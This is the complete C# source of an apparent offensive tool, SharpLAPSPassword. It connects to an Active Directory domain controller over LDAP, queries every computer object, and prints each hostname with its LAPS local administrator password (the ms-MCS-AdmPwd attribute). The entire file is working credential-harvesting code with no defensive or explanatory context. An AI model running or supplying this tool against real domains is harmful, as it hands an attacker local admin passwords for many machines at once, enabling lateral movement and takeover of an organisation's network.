using System;
using System.DirectoryServices;
using CommandLine;

namespace SharpLAPSPassword
{
    class Program
    {
        public class Options
        {
            [Option('d', "domaincontroller", Required = true, HelpText = "Domain controller ip or name.")]
            public string Domaincontroller { get; set; }

            [Option('u', "username", Required = false, HelpText = "Username.")]
            public string username { get; set; }

            [Option('p', "password", Required = false, HelpText = "Password")]
            public string password { get; set; }

        }

        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed<Options>(o =>
                {
                    DirectoryEntry entry = new DirectoryEntry($"LDAP://{o.Domaincontroller}");
                    if(o.username != null && o.password != null)
                    {
                        entry.Username = o.username;
                        entry.Password = o.password;
                    }
                    DirectorySearcher dSearch = new DirectorySearcher(entry);
                    dSearch.Filter = "(&(objectCategory=Computer))";
                    foreach (SearchResult result in dSearch.FindAll())
                    {
                        if (result.Properties["ms-MCS-AdmPwd"].Count > 0)
                        {
                            Console.WriteLine(result.Properties["dnshostname"][0].ToString() + ":" + result.Properties["ms-MCS-AdmPwd"][0].ToString());
                        }
                    }
                })
                .WithNotParsed<Options>(e =>
                {
                    Console.WriteLine("Missing or invalid arguments");
                });
        }
    }
}
